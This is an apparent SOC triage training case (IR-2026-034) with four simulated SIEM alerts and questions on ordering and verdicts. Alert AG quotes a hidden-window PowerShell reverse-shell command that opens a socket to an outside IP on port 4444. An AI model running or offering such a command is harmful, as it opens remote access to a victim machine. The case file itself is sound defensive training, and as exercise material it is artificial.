# Case 018 — Phase 3: Rapid-Response Judgment (No Splunk Verification)

**Incident ID:** IR-2026-034
**Date Detected:** 2026-07-06
**Host:** JIMIL-JOSHI
**Reported By:** SOC Monitoring (SIEM Alert, ticket data only)
**Status:** 🔴 Open — Pending Triage

**Phase:** 3 — Rapid-response judgment variant. Unlike prior cases, this batch was triaged from ticket data alone, with no live command reproduction or Splunk query verification, simulating a real-time queue decision made under time pressure before full evidence-gathering is possible. This is a deliberate methodology choice to test first-instinct accuracy separate from the slower, iterative investigation process used in Cases 001-017.

---

## 🎫 Initial Queue — 4 Alerts

| # | Alert | Type | SIEM Severity |
|---|---|---|---|
| 1 | Alert AG | PowerShell reverse-shell socket code | 🔴 High |
| 2 | Alert AJ | Local audit policy modification (subcategory force-disable) | 🔴 High |
| 3 | Alert AH | New Chrome extension installed | 🟠 Medium |
| 4 | Alert AI | BitLocker recovery key accessed | 🟡 Low |

**Analyst's chosen order:** AG → AJ → AH → AI

---

## 📄 Raw Ticket Data

### Alert AG
```
Process: powershell.exe
Command: powershell.exe -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('194.31.98.14',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)}"
Account: hp | Parent: cmd.exe
```

### Alert AJ
```
Event: Local security policy modified — "Audit: Force audit policy subcategory settings" set to Disabled
Account: hp | Parent: cmd.exe
```

### Alert AH
```
Event: New Chrome extension installed — "AdBlock Ultra Pro"
Account: hp | Source: Chrome Web Store (official)
```

### Alert AI
```
Event: BitLocker recovery key accessed via Control Panel
Account: hp | Time: 11:45 AM
```

---

## 🎯 Task

1. Determine triage order across all 4 alerts and justify it.
2. Give a fast verdict (TP/FP/Ambiguous) for each based on ticket data alone.
3. For Alert AJ: does disabling audit policy subcategory forcing have any legitimate everyday use case for a standard user?
4. For Alert AI: does the source/method of access to a BitLocker recovery key change the verdict, in the absence of a stated reason?
